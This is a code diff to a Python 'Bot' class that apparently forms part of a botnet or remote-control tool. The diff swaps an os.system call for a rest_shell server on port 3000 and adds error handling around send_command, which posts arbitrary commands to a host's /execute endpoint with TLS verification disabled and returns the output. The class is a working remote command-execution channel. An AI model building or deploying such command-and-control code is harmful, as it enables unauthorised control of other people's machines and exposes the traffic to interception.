@@ -1,6 +1,7 @@
-from common.commondefs import false
-from common.commondefs import true
-from common.commondefs import none
+from src.common.commondefs import false
+from src.common.commondefs import true
+from src.common.commondefs import none
+import rest_shell
 import marshal
 import sys
 import os
@@ -20,22 +21,25 @@ class Bot:
 
     # open rest gateway to bot
     def rest(self):
+        print('-- REST -- starting rest server...')
         try:
-            os.system('cd\nrest-shell --server localhost:3000') # Start server
-        except Exception as e:
-            print('connection failure')
-            print(e)
+            rest_shell.run(':3000') # Start rest server
+        except Exception:
+            print('-- CONNECTION -- connection failure')
 
     # sending a command to the client
     def send_command(self, command):
-        print('\nattempting on host '+self.host+'\n')
-        url = "https://"+self.host+":3000/execute" # Get addr
+        try:
+            print('\nattempting on host '+self.host+'\n')
+            url = "https://"+self.host+":3000/execute" # Get addr
 
-        data = {'command': command} # Set request data
-        headers = {'Content-Type': 'application/json'} # Init request headers
-        r = requests.post(url, data=json.dumps(data), headers=headers, verify=false) # Send request
+            data = {'command': command} # Set request data
+            headers = {'Content-Type': 'application/json'} # Init request headers
+            r = requests.post(url, data=json.dumps(data), headers=headers, verify=false) # Send request
 
-        return r.json() # Return response
+            return r.json() # Return response
+        except Exception:
+            print('client refused connection')
 
     # dump to bytes
     def to_bytes(self):
